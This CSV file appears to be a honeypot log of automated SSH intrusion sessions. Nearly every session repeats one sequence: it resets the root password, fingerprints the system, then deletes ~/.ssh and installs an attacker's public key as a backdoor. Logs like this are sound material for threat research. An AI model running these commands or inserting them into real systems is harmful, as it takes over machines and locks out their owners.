id,session,timestamp,realm,input
74600,526891d53e8f,2022-11-26T19:21:52.818368Z,,"crontab -l"
74601,526891d53e8f,2022-11-26T19:21:53.318396Z,,w
74602,526891d53e8f,2022-11-26T19:21:53.788084Z,,"uname -m"
74603,526891d53e8f,2022-11-26T19:21:54.328132Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74604,526891d53e8f,2022-11-26T19:21:54.793824Z,,top
74605,526891d53e8f,2022-11-26T19:21:55.331178Z,,uname
74606,526891d53e8f,2022-11-26T19:21:55.838088Z,,"uname -a"
74607,526891d53e8f,2022-11-26T19:21:56.309695Z,,"lscpu | grep Model"
74608,526891d53e8f,2022-11-26T19:21:56.844244Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74609,b1e5c16a4f40,2022-11-26T19:25:09.829003Z,,"cat /proc/cpuinfo | grep name | wc -l"
74610,b1e5c16a4f40,2022-11-26T19:25:10.618475Z,,"echo ""root:LQxUhjHIGHBa""|chpasswd|bash"
74611,b1e5c16a4f40,2022-11-26T19:25:11.355200Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74612,b1e5c16a4f40,2022-11-26T19:25:12.062679Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74613,b1e5c16a4f40,2022-11-26T19:25:12.847927Z,,"which ls"
74614,b1e5c16a4f40,2022-11-26T19:25:12.847258Z,,"ls -lh $(which ls)"
74615,b1e5c16a4f40,2022-11-26T19:25:13.593175Z,,"crontab -l"
74616,b1e5c16a4f40,2022-11-26T19:25:14.297617Z,,w
74617,b1e5c16a4f40,2022-11-26T19:25:15.087000Z,,"uname -m"
74618,b1e5c16a4f40,2022-11-26T19:25:15.791914Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74619,b1e5c16a4f40,2022-11-26T19:25:16.572292Z,,top
74620,b1e5c16a4f40,2022-11-26T19:25:17.312729Z,,uname
74621,b1e5c16a4f40,2022-11-26T19:25:18.021915Z,,"uname -a"
74622,b1e5c16a4f40,2022-11-26T19:25:18.810241Z,,"lscpu | grep Model"
74623,b1e5c16a4f40,2022-11-26T19:25:19.513775Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74624,3f66208998a8,2022-11-26T19:33:52.615343Z,,"cat /proc/cpuinfo | grep name | wc -l"
74625,3f66208998a8,2022-11-26T19:33:53.357416Z,,"Enter new UNIX password: "
74626,3f66208998a8,2022-11-26T19:33:53.358214Z,,"Enter new UNIX password:"
74627,3f66208998a8,2022-11-26T19:33:53.356126Z,,"echo -e ""root1234\nEYwmszYzU2m3\nEYwmszYzU2m3""|passwd|bash"
74628,3f66208998a8,2022-11-26T19:33:54.056039Z,,"echo ""root1234\nEYwmszYzU2m3\nEYwmszYzU2m3\n""|passwd"
74629,3f66208998a8,2022-11-26T19:33:54.789491Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74630,3f66208998a8,2022-11-26T19:33:55.491256Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74631,3f66208998a8,2022-11-26T19:33:56.264021Z,,"which ls"
74632,3f66208998a8,2022-11-26T19:33:56.262901Z,,"ls -lh $(which ls)"
74633,3f66208998a8,2022-11-26T19:33:56.999951Z,,"crontab -l"
74634,3f66208998a8,2022-11-26T19:33:57.698892Z,,w
74635,3f66208998a8,2022-11-26T19:33:58.471755Z,,"uname -m"
74636,3f66208998a8,2022-11-26T19:33:59.207996Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74637,3f66208998a8,2022-11-26T19:33:59.908288Z,,top
74638,3f66208998a8,2022-11-26T19:34:00.686653Z,,uname
74639,3f66208998a8,2022-11-26T19:34:01.388273Z,,"uname -a"
74640,3f66208998a8,2022-11-26T19:34:02.161242Z,,"lscpu | grep Model"
74641,3f66208998a8,2022-11-26T19:34:02.898197Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74642,c287667a0a4f,2022-11-26T19:36:42.704081Z,,"cat /proc/cpuinfo | grep name | wc -l"
74643,c287667a0a4f,2022-11-26T19:36:42.896306Z,,"echo ""root:c5as7o4LjQxM""|chpasswd|bash"
74644,c287667a0a4f,2022-11-26T19:36:42.996090Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74645,c287667a0a4f,2022-11-26T19:36:43.168402Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74646,c287667a0a4f,2022-11-26T19:36:43.298346Z,,"which ls"
74647,c287667a0a4f,2022-11-26T19:36:43.297633Z,,"ls -lh $(which ls)"
74648,c287667a0a4f,2022-11-26T19:36:43.399818Z,,"crontab -l"
74649,c287667a0a4f,2022-11-26T19:36:43.576507Z,,w
74650,c287667a0a4f,2022-11-26T19:36:43.675372Z,,"uname -m"
74651,c287667a0a4f,2022-11-26T19:36:43.846072Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74652,c287667a0a4f,2022-11-26T19:36:43.978005Z,,top
74653,c287667a0a4f,2022-11-26T19:36:44.078152Z,,uname
74654,c287667a0a4f,2022-11-26T19:36:44.255826Z,,"uname -a"
74655,c287667a0a4f,2022-11-26T19:36:44.390721Z,,"lscpu | grep Model"
74656,c287667a0a4f,2022-11-26T19:36:44.489707Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74657,839eeeac58ca,2022-11-26T19:39:54.907856Z,,"cat /proc/cpuinfo | grep name | wc -l"
74658,839eeeac58ca,2022-11-26T19:39:55.416928Z,,"echo ""root:AnBy1ThCOsFu""|chpasswd|bash"
74659,839eeeac58ca,2022-11-26T19:39:55.997441Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74660,839eeeac58ca,2022-11-26T19:39:56.552073Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74661,839eeeac58ca,2022-11-26T19:39:57.060224Z,,"which ls"
74662,839eeeac58ca,2022-11-26T19:39:57.059260Z,,"ls -lh $(which ls)"
74663,839eeeac58ca,2022-11-26T19:39:57.643135Z,,"crontab -l"
74664,839eeeac58ca,2022-11-26T19:39:58.149877Z,,w
74665,839eeeac58ca,2022-11-26T19:39:58.729721Z,,"uname -m"
74666,839eeeac58ca,2022-11-26T19:39:59.272955Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74667,839eeeac58ca,2022-11-26T19:39:59.779609Z,,top
74668,839eeeac58ca,2022-11-26T19:40:00.361084Z,,uname
74669,839eeeac58ca,2022-11-26T19:40:00.869503Z,,"uname -a"
74670,839eeeac58ca,2022-11-26T19:40:01.449225Z,,"lscpu | grep Model"
74671,839eeeac58ca,2022-11-26T19:40:01.996162Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74672,f3f181597586,2022-11-26T19:49:55.111795Z,,"cat /proc/cpuinfo | grep name | wc -l"
74673,f3f181597586,2022-11-26T19:49:55.483023Z,,"echo ""root:BbV4kwYjcJV5""|chpasswd|bash"
74674,f3f181597586,2022-11-26T19:49:55.796593Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74675,f3f181597586,2022-11-26T19:49:56.076524Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74676,f3f181597586,2022-11-26T19:49:56.431457Z,,"which ls"
74677,f3f181597586,2022-11-26T19:49:56.430729Z,,"ls -lh $(which ls)"
74678,f3f181597586,2022-11-26T19:49:56.708297Z,,"crontab -l"
74679,f3f181597586,2022-11-26T19:49:57.054257Z,,w
74680,f3f181597586,2022-11-26T19:49:57.369513Z,,"uname -m"
74681,f3f181597586,2022-11-26T19:49:57.650053Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74682,f3f181597586,2022-11-26T19:49:58.004719Z,,top
74683,f3f181597586,2022-11-26T19:49:58.284043Z,,uname
74684,f3f181597586,2022-11-26T19:49:58.635846Z,,"uname -a"
74685,f3f181597586,2022-11-26T19:49:58.965503Z,,"lscpu | grep Model"
74686,f3f181597586,2022-11-26T19:49:59.244143Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74687,55278c82077a,2022-11-26T19:51:44.055168Z,,"cat /proc/cpuinfo | grep name | wc -l"
74688,55278c82077a,2022-11-26T19:51:44.530598Z,,"echo ""root:vZZ7CEKCRG61""|chpasswd|bash"
74689,55278c82077a,2022-11-26T19:51:44.971329Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74690,55278c82077a,2022-11-26T19:51:45.485116Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74691,55278c82077a,2022-11-26T19:51:45.929582Z,,"which ls"
74692,55278c82077a,2022-11-26T19:51:45.928885Z,,"ls -lh $(which ls)"
74693,55278c82077a,2022-11-26T19:51:46.443114Z,,"crontab -l"
74694,55278c82077a,2022-11-26T19:51:46.920781Z,,w
74695,55278c82077a,2022-11-26T19:51:47.360870Z,,"uname -m"
74696,55278c82077a,2022-11-26T19:51:47.879997Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74697,55278c82077a,2022-11-26T19:51:48.322376Z,,top
74698,55278c82077a,2022-11-26T19:51:48.837901Z,,uname
74699,55278c82077a,2022-11-26T19:51:49.319515Z,,"uname -a"
74700,55278c82077a,2022-11-26T19:51:49.766656Z,,"lscpu | grep Model"
74701,55278c82077a,2022-11-26T19:51:50.282458Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74702,6ae1282e1012,2022-11-26T19:52:25.639738Z,,"cat /proc/cpuinfo | grep name | wc -l"
74703,6ae1282e1012,2022-11-26T19:52:26.328303Z,,"echo ""root:CubdIRoy7H79""|chpasswd|bash"
74704,6ae1282e1012,2022-11-26T19:52:26.960760Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74705,6ae1282e1012,2022-11-26T19:52:27.559544Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74706,6ae1282e1012,2022-11-26T19:52:28.232635Z,,"which ls"
74707,6ae1282e1012,2022-11-26T19:52:28.231898Z,,"ls -lh $(which ls)"
74708,6ae1282e1012,2022-11-26T19:52:28.866852Z,,"crontab -l"
74709,6ae1282e1012,2022-11-26T19:52:29.461111Z,,w
74710,6ae1282e1012,2022-11-26T19:52:30.132826Z,,"uname -m"
74711,6ae1282e1012,2022-11-26T19:52:30.731441Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74712,6ae1282e1012,2022-11-26T19:52:31.402540Z,,top
74713,6ae1282e1012,2022-11-26T19:52:32.034502Z,,uname
74714,6ae1282e1012,2022-11-26T19:52:32.630314Z,,"uname -a"
74715,6ae1282e1012,2022-11-26T19:52:33.299214Z,,"lscpu | grep Model"
74716,6ae1282e1012,2022-11-26T19:52:33.901513Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74717,2533c6689470,2022-11-26T19:52:53.370413Z,,"cat /proc/cpuinfo | grep name | wc -l"
74718,2533c6689470,2022-11-26T19:52:53.850700Z,,"echo ""root:85Pa0DxpCdk8""|chpasswd|bash"
74719,2533c6689470,2022-11-26T19:52:54.291448Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74720,2533c6689470,2022-11-26T19:52:54.810337Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74721,2533c6689470,2022-11-26T19:52:55.252751Z,,"which ls"
74722,2533c6689470,2022-11-26T19:52:55.251673Z,,"ls -lh $(which ls)"
74723,2533c6689470,2022-11-26T19:52:55.770227Z,,"crontab -l"
74724,2533c6689470,2022-11-26T19:52:56.244316Z,,w
74725,2533c6689470,2022-11-26T19:52:56.686125Z,,"uname -m"
74726,2533c6689470,2022-11-26T19:52:57.205364Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
74727,2533c6689470,2022-11-26T19:52:57.684481Z,,top
74728,2533c6689470,2022-11-26T19:52:58.130919Z,,uname
74729,2533c6689470,2022-11-26T19:52:58.652426Z,,"uname -a"
74730,2533c6689470,2022-11-26T19:52:59.094424Z,,"lscpu | grep Model"
74731,2533c6689470,2022-11-26T19:52:59.610313Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
74732,53e2c1184489,2022-11-26T19:54:03.360108Z,,"cat /proc/cpuinfo | grep name | wc -l"
74733,53e2c1184489,2022-11-26T19:54:03.801916Z,,"echo ""root:cIMgsskd7zCa""|chpasswd|bash"
74734,53e2c1184489,2022-11-26T19:54:04.326455Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
74735,53e2c1184489,2022-11-26T19:54:04.772732Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
74736,53e2c1184489,2022-11-26T19:54:05.290339Z,,"which ls"
74737,53e2c1184489,2022-11-26T19:54:05.289617Z,,"ls -lh $(which ls)"
74738,53e2c1184489,2022-11-26T19:54:05.770438Z,,"crontab -l"
74739,53e2c1184489,2022-11-26T19:54:06.217908Z,,w
